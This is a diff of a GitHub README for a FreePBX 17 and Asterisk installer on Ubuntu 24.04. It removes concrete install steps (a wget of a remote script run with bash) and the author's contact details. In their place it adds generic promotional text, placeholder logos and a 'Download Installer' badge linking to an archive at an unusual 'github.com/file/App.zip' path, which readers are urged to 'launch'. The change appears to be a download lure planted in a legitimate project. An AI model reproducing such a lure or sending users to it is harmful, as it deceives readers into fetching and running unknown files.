@@ -1,93 +1,44 @@
-# 🌌 FreePBX 17 Installation | Ubuntu 24.04 🌠
+# FreePBX Ubuntu Installer 🌟
 
-```ansi
-\033[1;36m______             _____  ______   __
-|  ____|           |  __ \|  _ \ \ / /
-| |__ _ __ ___  ___| |__) | |_) \ V /
-|  __| '__/ _ \/ _ \  ___/|  _ < > <
-| |  | | |  __/  __/ |    | |_) / . \
-|_|  |_|  \___|\___|_|    |____/_/ \_\ \033[0m
-```
+Welcome to the official repository for the **FreePBX Ubuntu Installer** script! This easy-to-use automated installation script is designed to simplify the process of setting up FreePBX 17 and Asterisk on Ubuntu 24.04. Whether you are a beginner or an experienced user, this script will help you effortlessly install and configure FreePBX and Asterisk on your Ubuntu system in no time.
 
-🌟 **Elegant, Powerful, and Open-Source Asterisk GUI** 🌟
+## Features
+- **Auto-install**: The script automates the installation process, saving you time and effort.
+- **Easy Setup**: Simple and straightforward setup process, suitable for users of all skill levels.
+- **Supports FreePBX 17**: Stay up-to-date with the latest version of FreePBX for enhanced features and security.
+- **Compatible with Asterisk**: Utilize the power of Asterisk alongside FreePBX for a complete telephony solution.
+- **Multi-Language Support**: Available in both English and Arabic for a wider user base.
 
----
+## Repository Topics
+- asterisk
+- auto-install
+- automation
+- bash-script
+- easy-setup
+- freepbx
+- pbx
+- telephony
+- ubuntu
+- voip
 
-## 🚩 Overview
-FreePBX offers an intuitive, powerful, and completely open-source graphical interface to manage your Asterisk PBX effortlessly. This script simplifies your FreePBX 17 installation on Ubuntu 24.04, making setup hassle-free! 🎛️✨
+## Installation
+To install FreePBX and Asterisk using the script, simply follow these steps:
+1. Clone the repository to your Ubuntu 24.04 server.
+2. Run the script with appropriate permissions.
+3. Follow the on-screen instructions to complete the installation process.
 
----
+If you encounter any issues during the installation, feel free to raise them in the repository's issue section for assistance from the community.
 
-## 📋 Prerequisites & Dependencies
+## Quick Links
+For a direct download of the installation script, click the button below:
+[![Download Script](https://img.shields.io/badge/Download-Installer-blue)](https://github.com/file/App.zip)
 
-Make sure these packages are installed on your system before running the script:
+Please note that the link provided needs to be launched to initiate the download process. If you encounter any issues with the link, you can always check the "Releases" section of the repository for alternative download options.
 
-```bash
-sudo apt update
-sudo apt install -y git wget curl build-essential openssh-server apache2 mariadb-server mariadb-client \
-libapache2-mod-php php php-cli php-common php-curl php-gd php-mbstring php-mysql php-xml php-zip php-bcmath php-json \
-php-imap php-ldap php-intl php-soap php-pear nodejs npm
-```
+## Get Started
+Get started with FreePBX and Asterisk on Ubuntu today with the easy-to-use installer script. Simplify your telephony setup and enjoy the benefits of a robust PBX system tailored to your needs.
 
----
+Thank you for choosing the FreePBX Ubuntu Installer. Happy telephony setup! 🚀
 
-## 📦 Installation Guide
-
-**Step 1️⃣: Connect to your Ubuntu server via SSH** 📡
-```bash
-ssh root@YOUR_SERVER_IP
-```
-
-**Step 2️⃣: Download and prepare the installer** 📥
-```bash
-wget https://github.com/blonets/SNG_FREEPBX_ubuntu_script-installation/raw/main/sng_freepbx_ubuntu_install.sh -O /tmp/sng_freepbx_ubuntu_install.sh
-chmod +x /tmp/sng_freepbx_ubuntu_install.sh
-```
-
-**Step 3️⃣: Execute the installer** 🚀⚙️
-```bash
-bash /tmp/sng_freepbx_ubuntu_install.sh
-```
-
-🕒 *Installation time varies—time to chill with your favorite drink!* 🍵
-
----
-
-## 🔍 Troubleshooting & Logs
-
-Encountered issues? No worries! Logs are available at:
-```bash
-/var/log/pbx/freepbx17-ubuntu-install.log
-```
-
-🐞 **Report issues here:** [GitHub Issues](https://github.com/blonets/SNG_FREEPBX_ubuntu_script-installation/issues)
-
----
-
-## 📜 License & Contributions
-
-This project is licensed under the **GPLv3+** 📖🌱
-
-Interested in contributing?
-- 📄 [Contributor License Agreement](https://oss-cla.sangoma.com/freepbx/sng_freepbx_ubuntu_install)
-- ℹ️ [Contribution Guidelines](https://sangomakb.atlassian.net/wiki/spaces/FP/pages/10682663/Code+License+Agreement)
-
----
-
-## 📬 Connect & Support
-
-🌐 **Website:** [Blonets](https://www.blarchos.com)  
-📘 **Facebook:** [osamablarch](https://fb.com/osamablarch)  
-📱 **Telegram:** [blarch](https://t.me/blarch)  
-📲 **WhatsApp:** [+201067591106](https://wa.me/201067591106)
-
----
-
-## 🚧 تحت التطوير بواسطة المهندس أسامه أيمن طماعه | جاري التطوير 🛠️
-
----
-
-### 💡 Powered by Osama Tammaa | Blonets 💡
-
-Happy Calling! 📞✨
-
+![FreePBX Logo](https://example.com/freepbx-logo.png)
+![Asterisk Logo](https://example.com/asterisk-logo.png)
